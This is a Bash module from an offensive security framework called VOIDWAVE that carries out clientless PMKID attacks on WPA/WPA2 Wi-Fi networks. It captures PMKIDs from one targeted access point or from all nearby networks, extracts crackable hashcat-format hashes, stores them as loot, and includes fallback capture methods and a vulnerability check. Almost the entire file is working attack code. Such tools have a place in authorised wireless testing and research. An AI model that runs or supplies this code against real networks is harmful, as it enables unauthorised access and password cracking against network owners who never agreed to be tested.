#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# PMKID Attack: Clientless WPA/WPA2 attack using hcxdumptool/hcxtools
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_PMKID_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_PMKID_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

# Source wireless modules if available
[[ -f "${BASH_SOURCE%/*}/../wireless/loot.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/loot.sh"
[[ -f "${BASH_SOURCE%/*}/../wireless/session.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/session.sh"

#═══════════════════════════════════════════════════════════════════════════════
# PMKID CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Default timeouts and settings
declare -g PMKID_CAPTURE_TIMEOUT="${PMKID_CAPTURE_TIMEOUT:-120}"
declare -g PMKID_SCAN_TIMEOUT="${PMKID_SCAN_TIMEOUT:-60}"
declare -g PMKID_RETRY_COUNT="${PMKID_RETRY_COUNT:-3}"
declare -g PMKID_ATTACK_MODE="${PMKID_ATTACK_MODE:-2}"  # 2 = active, 9 = passive

# Capture state
declare -g _PMKID_CAPTURE_PID=""
declare -g _PMKID_CAPTURED="false"
declare -g _PMKID_FILE=""
declare -g _PMKID_HASH=""

#═══════════════════════════════════════════════════════════════════════════════
# PMKID VALIDATION
#═══════════════════════════════════════════════════════════════════════════════

# Check if hcxdumptool capture contains PMKID
# Args: $1 = pcapng file, $2 = target BSSID (optional)
# Returns: 0 if PMKID found, 1 if not
pmkid_validate() {
    local capture_file="$1"
    local target_bssid="${2:-}"

    if [[ ! -f "$capture_file" ]]; then
        log_debug "Capture file not found: $capture_file"
        return 1
    fi

    # Use hcxpcapngtool to extract PMKID
    if command -v hcxpcapngtool &>/dev/null; then
        local temp_hash
        temp_hash=$(mktemp)

        if hcxpcapngtool -o "$temp_hash" "$capture_file" &>/dev/null; then
            if [[ -s "$temp_hash" ]]; then
                # Check if target BSSID is in the hash
                if [[ -n "$target_bssid" ]]; then
                    local bssid_hex
                    bssid_hex=$(echo "$target_bssid" | tr -d ':' | tr '[:upper:]' '[:lower:]')

                    if grep -qi "$bssid_hex" "$temp_hash"; then
                        log_debug "PMKID found for target $target_bssid"
                        rm -f "$temp_hash"
                        return 0
                    fi
                else
                    log_debug "PMKID found in capture"
                    rm -f "$temp_hash"
                    return 0
                fi
            fi
        fi

        rm -f "$temp_hash"
    fi

    log_debug "No PMKID found in $capture_file"
    return 1
}

# Extract PMKID hash from capture
# Args: $1 = pcapng file, $2 = target BSSID (optional)
# Returns: hash string
pmkid_extract_hash() {
    local capture_file="$1"
    local target_bssid="${2:-}"

    if ! command -v hcxpcapngtool &>/dev/null; then
        log_error "hcxpcapngtool not found"
        return 1
    fi

    local temp_hash
    temp_hash=$(mktemp)

    hcxpcapngtool -o "$temp_hash" "$capture_file" &>/dev/null

    if [[ -s "$temp_hash" ]]; then
        if [[ -n "$target_bssid" ]]; then
            local bssid_hex
            bssid_hex=$(echo "$target_bssid" | tr -d ':' | tr '[:upper:]' '[:lower:]')
            grep -i "$bssid_hex" "$temp_hash"
        else
            cat "$temp_hash"
        fi
    fi

    rm -f "$temp_hash"
}

#═══════════════════════════════════════════════════════════════════════════════
# PMKID CAPTURE - HCXDUMPTOOL
#═══════════════════════════════════════════════════════════════════════════════

# Start PMKID capture using hcxdumptool
# Args: $1 = interface, $2 = output file, $3 = filterlist file (optional), $4 = mode (optional)
pmkid_capture_start() {
    local iface="$1"
    local output_file="$2"
    local filterlist="${3:-}"
    local mode="${4:-$PMKID_ATTACK_MODE}"

    # Stop any existing capture
    pmkid_capture_stop

    if ! command -v hcxdumptool &>/dev/null; then
        log_error "hcxdumptool not found - install hcxtools package"
        return 1
    fi

    log_info "Starting PMKID capture on $iface"

    local cmd=(hcxdumptool -i "$iface" -o "$output_file" --active_beacon --enable_status="$mode")

    # Add filterlist if provided
    if [[ -n "$filterlist" && -f "$filterlist" ]]; then
        cmd+=(--filterlist_ap="$filterlist" --filtermode=2)
        log_debug "Using filterlist: $filterlist"
    fi

    # Run capture
    "${cmd[@]}" &>/dev/null &
    _PMKID_CAPTURE_PID=$!
    _PMKID_FILE="$output_file"

    log_debug "PMKID capture started (PID: $_PMKID_CAPTURE_PID)"
    return 0
}

# Stop PMKID capture
pmkid_capture_stop() {
    if [[ -n "$_PMKID_CAPTURE_PID" ]]; then
        kill "$_PMKID_CAPTURE_PID" 2>/dev/null
        wait "$_PMKID_CAPTURE_PID" 2>/dev/null
        _PMKID_CAPTURE_PID=""
        log_debug "PMKID capture stopped"
    fi
}

# Check capture status
# Returns: 0 if PMKID captured, 1 if still capturing, 2 if failed
pmkid_capture_status() {
    local target_bssid="${1:-}"

    if [[ ! -f "$_PMKID_FILE" ]]; then
        return 1  # Still capturing
    fi

    if pmkid_validate "$_PMKID_FILE" "$target_bssid"; then
        _PMKID_CAPTURED="true"
        return 0  # Success
    fi

    # Check if capture process is still running
    if [[ -n "$_PMKID_CAPTURE_PID" ]] && kill -0 "$_PMKID_CAPTURE_PID" 2>/dev/null; then
        return 1  # Still capturing
    fi

    return 2  # Failed
}

# Full PMKID capture targeting specific AP
# Args: $1 = interface, $2 = AP BSSID, $3 = ESSID (optional for display)
pmkid_capture_target() {
    local iface="$1"
    local ap_bssid="$2"
    local essid="${3:-Unknown}"

    local output_dir="${WIRELESS_LOOT_PMKIDS:-/tmp}"
    local output_file="${output_dir}/${essid//[^a-zA-Z0-9]/_}_${ap_bssid//:/}.pcapng"
    local filterlist
    filterlist=$(mktemp)

    # Create filterlist with target BSSID
    echo "$ap_bssid" | tr -d ':' >> "$filterlist"

    log_info "Starting targeted PMKID attack on ${C_WHITE}$essid${C_RESET}"
    log_info "Target: $ap_bssid"

    # Update session state if available
    if declare -F wireless_session_set &>/dev/null; then
        wireless_session_set "target_bssid" "$ap_bssid"
        wireless_session_set "target_essid" "$essid"
        wireless_session_set "attack_type" "pmkid"
        wireless_session_set "attack_status" "capturing"
    fi

    # Start capture
    pmkid_capture_start "$iface" "$output_file" "$filterlist"

    # Wait for PMKID or timeout
    local start_time
    start_time=$(date +%s)
    local timeout="$PMKID_CAPTURE_TIMEOUT"

    while true; do
        local elapsed=$(($(date +%s) - start_time))

        # Check timeout
        if [[ $elapsed -ge $timeout ]]; then
            log_warning "PMKID capture timeout after ${timeout}s"
            pmkid_capture_stop
            rm -f "$filterlist"

            # Check if we got it anyway
            if pmkid_validate "$output_file" "$ap_bssid"; then
                break
            fi

            return 1
        fi

        # Check if PMKID captured
        if pmkid_capture_status "$ap_bssid"; then
            log_success "PMKID captured!"
            pmkid_capture_stop
            break
        fi

        # Status update every 15 seconds
        if [[ $((elapsed % 15)) -eq 0 && $elapsed -gt 0 ]]; then
            log_info "Waiting for PMKID... ${elapsed}s elapsed"
        fi

        sleep 3
    done

    rm -f "$filterlist"

    # Extract hash
    local hash
    hash=$(pmkid_extract_hash "$output_file" "$ap_bssid")

    if [[ -n "$hash" ]]; then
        _PMKID_HASH="$hash"
        log_success "PMKID hash extracted"

        # Save hash to loot
        local hash_file="${output_dir}/${essid//[^a-zA-Z0-9]/_}_${ap_bssid//:/}.22000"
        echo "$hash" > "$hash_file"

        # Update session
        if declare -F wireless_session_set &>/dev/null; then
            wireless_session_set "pmkid_captured" "true"
            wireless_session_set "attack_status" "success"
        fi

        return 0
    fi

    return 1
}

# Scan and capture PMKIDs from all networks
# Args: $1 = interface
pmkid_capture_all() {
    local iface="$1"

    local output_dir="${WIRELESS_LOOT_PMKIDS:-/tmp}"
    local output_file="${output_dir}/pmkid_scan_$(date +%Y%m%d_%H%M%S).pcapng"

    log_info "Starting PMKID mass capture on $iface"
    log_info "Output: $output_file"

    # Start capture without filter (all networks)
    pmkid_capture_start "$iface" "$output_file"

    local start_time
    start_time=$(date +%s)
    local timeout="$PMKID_SCAN_TIMEOUT"
    local last_count=0

    while true; do
        local elapsed=$(($(date +%s) - start_time))

        # Check timeout
        if [[ $elapsed -ge $timeout ]]; then
            log_info "Scan timeout reached"
            pmkid_capture_stop
            break
        fi

        # Check progress
        if [[ -f "$output_file" ]] && command -v hcxpcapngtool &>/dev/null; then
            local temp_hash
            temp_hash=$(mktemp)
            hcxpcapngtool -o "$temp_hash" "$output_file" &>/dev/null

            local current_count=0
            if [[ -f "$temp_hash" ]]; then
                current_count=$(wc -l < "$temp_hash")
            fi
            rm -f "$temp_hash"

            if [[ $current_count -gt $last_count ]]; then
                log_success "Captured PMKID #$current_count"
                last_count=$current_count
            fi
        fi

        # Status update every 20 seconds
        if [[ $((elapsed % 20)) -eq 0 && $elapsed -gt 0 ]]; then
            log_info "Scanning... ${elapsed}s elapsed ($last_count PMKIDs captured)"
        fi

        sleep 5
    done

    # Extract all hashes
    local hash_file="${output_file%.pcapng}.22000"
    if pmkid_extract_hash "$output_file" > "$hash_file"; then
        local final_count
        final_count=$(wc -l < "$hash_file")
        log_success "Captured $final_count PMKID(s)"
        log_info "Hash file: $hash_file"
        return 0
    fi

    log_warning "No PMKIDs captured"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# ALTERNATIVE PMKID METHODS
#═══════════════════════════════════════════════════════════════════════════════

# PMKID capture using aircrack-ng suite (fallback)
# Args: $1 = interface, $2 = AP BSSID, $3 = channel
pmkid_capture_aircrack() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"

    log_info "Attempting PMKID capture via aircrack-ng suite"

    # Set channel
    iwconfig "$iface" channel "$channel" 2>/dev/null

    local output_base
    output_base=$(mktemp)

    # Start capture
    airodump-ng --bssid "$ap_bssid" -c "$channel" -w "$output_base" --output-format pcap "$iface" &>/dev/null &
    local capture_pid=$!

    # Wait briefly for PMKID (sent in first association)
    sleep 20

    kill "$capture_pid" 2>/dev/null
    wait "$capture_pid" 2>/dev/null

    # Check for PMKID in capture
    local cap_file="${output_base}-01.cap"
    if [[ -f "$cap_file" ]]; then
        # Try to extract PMKID
        if command -v hcxpcapngtool &>/dev/null; then
            local hash_file="${cap_file%.cap}.22000"
            if hcxpcapngtool -o "$hash_file" "$cap_file" &>/dev/null; then
                if [[ -s "$hash_file" ]]; then
                    log_success "PMKID extracted via aircrack capture"
                    return 0
                fi
            fi
        fi
    fi

    rm -f "${output_base}"* 2>/dev/null
    log_warning "No PMKID captured via aircrack method"
    return 1
}

# PMKID capture using wpa_supplicant association (stealthy)
# Args: $1 = interface, $2 = AP BSSID, $3 = ESSID
pmkid_capture_wpa_supplicant() {
    local iface="$1"
    local ap_bssid="$2"
    local essid="$3"

    if ! command -v wpa_supplicant &>/dev/null; then
        log_error "wpa_supplicant not found"
        return 1
    fi

    log_info "Attempting PMKID capture via wpa_supplicant association"

    local conf_file
    conf_file=$(mktemp)
    local output_file
    output_file=$(mktemp).pcap

    # Create wpa_supplicant config
    cat > "$conf_file" << EOF
ctrl_interface=/var/run/wpa_supplicant
update_config=1

network={
    ssid="$essid"
    bssid=$ap_bssid
    key_mgmt=WPA-PSK
    psk="00000000"
}
EOF

    # Start tcpdump to capture EAPOL
    tcpdump -i "$iface" -w "$output_file" "ether proto 0x888e" &>/dev/null &
    local tcpdump_pid=$!

    # Start wpa_supplicant to trigger association
    timeout 10 wpa_supplicant -i "$iface" -c "$conf_file" &>/dev/null

    kill "$tcpdump_pid" 2>/dev/null
    wait "$tcpdump_pid" 2>/dev/null

    rm -f "$conf_file"

    # Check for PMKID
    if [[ -s "$output_file" ]]; then
        if command -v hcxpcapngtool &>/dev/null; then
            local hash_file="${output_file%.pcap}.22000"
            if hcxpcapngtool -o "$hash_file" "$output_file" &>/dev/null; then
                if [[ -s "$hash_file" ]]; then
                    log_success "PMKID captured via wpa_supplicant method"
                    return 0
                fi
            fi
        fi
    fi

    rm -f "$output_file"
    log_warning "No PMKID captured via wpa_supplicant method"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# PMKID ANALYSIS
#═══════════════════════════════════════════════════════════════════════════════

# Check if target AP is vulnerable to PMKID attack
# Args: $1 = interface, $2 = AP BSSID, $3 = channel
# Returns: 0 if likely vulnerable, 1 if not
pmkid_check_vulnerable() {
    local iface="$1"
    local ap_bssid="$2"
    local channel="$3"

    log_info "Checking PMKID vulnerability for $ap_bssid"

    # Quick PMKID capture attempt
    local old_timeout="$PMKID_CAPTURE_TIMEOUT"
    PMKID_CAPTURE_TIMEOUT=20

    local output_file
    output_file=$(mktemp).pcapng
    local filterlist
    filterlist=$(mktemp)

    echo "$ap_bssid" | tr -d ':' >> "$filterlist"

    pmkid_capture_start "$iface" "$output_file" "$filterlist"
    sleep 15
    pmkid_capture_stop

    rm -f "$filterlist"
    PMKID_CAPTURE_TIMEOUT="$old_timeout"

    if pmkid_validate "$output_file" "$ap_bssid"; then
        log_success "Target is vulnerable to PMKID attack"
        rm -f "$output_file"
        return 0
    fi

    rm -f "$output_file"
    log_info "Target may not be vulnerable (or needs longer capture time)"
    return 1
}

# Parse hash file and show network info
# Args: $1 = hash file
pmkid_show_info() {
    local hash_file="$1"

    if [[ ! -f "$hash_file" ]]; then
        log_error "Hash file not found: $hash_file"
        return 1
    fi

    echo ""
    echo -e "    ${C_CYAN}PMKID Hashes: $hash_file${C_RESET}"
    echo -e "    ${C_SHADOW}$(printf '─%.0s' {1..50})${C_RESET}"

    local count=0
    while IFS='*' read -r type pmkid ap_mac client_mac essid_hex; do
        [[ -z "$pmkid" ]] && continue
        ((count++)) || true

        # Decode ESSID from hex
        local essid=""
        if [[ -n "$essid_hex" ]]; then
            essid=$(echo "$essid_hex" | xxd -r -p 2>/dev/null)
        fi

        # Format MAC
        local ap_formatted
        ap_formatted=$(echo "$ap_mac" | sed 's/../&:/g' | sed 's/:$//' | tr '[:lower:]' '[:upper:]')

        printf "    ${C_GHOST}%-3s${C_RESET} ESSID: ${C_WHITE}%-20s${C_RESET} BSSID: %s\n" \
            "[$count]" "${essid:-<hidden>}" "$ap_formatted"
    done < "$hash_file"

    echo -e "    ${C_SHADOW}$(printf '─%.0s' {1..50})${C_RESET}"
    echo -e "    Total: $count PMKID(s)"
    echo ""
}

#═══════════════════════════════════════════════════════════════════════════════
# CLEANUP
#═══════════════════════════════════════════════════════════════════════════════

# Cleanup function for PMKID capture
pmkid_cleanup() {
    pmkid_capture_stop

    # Clean temp files
    rm -f /tmp/pmkid_*.pcapng 2>/dev/null
    rm -f /tmp/pmkid_*.22000 2>/dev/null
}

# Register cleanup (uses cleanup registry to prevent trap overwriting)
register_cleanup pmkid_cleanup

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f pmkid_validate pmkid_extract_hash
export -f pmkid_capture_start pmkid_capture_stop pmkid_capture_status
export -f pmkid_capture_target pmkid_capture_all
export -f pmkid_capture_aircrack pmkid_capture_wpa_supplicant
export -f pmkid_check_vulnerable pmkid_show_info
export -f pmkid_cleanup
